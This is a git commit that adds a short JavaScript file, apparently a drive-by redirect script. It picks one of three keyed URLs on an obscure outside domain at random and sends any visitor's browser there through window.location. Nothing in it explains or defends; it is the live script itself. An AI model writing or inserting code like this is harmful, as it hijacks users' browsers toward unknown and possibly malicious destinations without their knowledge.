2efbab6dc5f93374efdfa662de61c8069024f966
inisialjurawa <84512688+inisialjurawa@users.noreply.github.com>
2021-05-20 22:06:38 +0800

    Create fatrqarw.js

---
+++ fatrqarw.js
@@ -0,0 +1,7 @@
+var dataUrl = [
+  '//wonderfullytumultbizarre.com/k78nwxfv?key=e668079d92f5c385e97d9e9f30beedd3',
+  '//wonderfullytumultbizarre.com/ezuq8wdg?key=abe65c5f1fac7c85a5e79772f3e4b4ab',
+  '//wonderfullytumultbizarre.com/jrzhg39q?key=c57734d92ebaa11a56b389a5ea6dd78e'
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
